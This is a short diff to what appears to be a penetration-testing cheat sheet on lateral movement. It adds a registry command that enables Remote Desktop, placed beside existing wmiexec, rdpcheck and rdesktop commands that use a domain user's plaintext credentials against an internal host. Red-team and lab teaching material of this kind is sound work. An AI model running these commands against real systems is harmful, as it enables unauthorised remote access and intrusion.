@@ -47,6 +47,10 @@ python wmiexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
 python rdpcheck.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
 rdesktop -d CSCOU -u jarrieta -p nastyCutt3r 10.9.122.5
 ```
+Note: you may need to enable it with the following command
+```
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
+```
 
 ## Netuse (Windows)
 ```
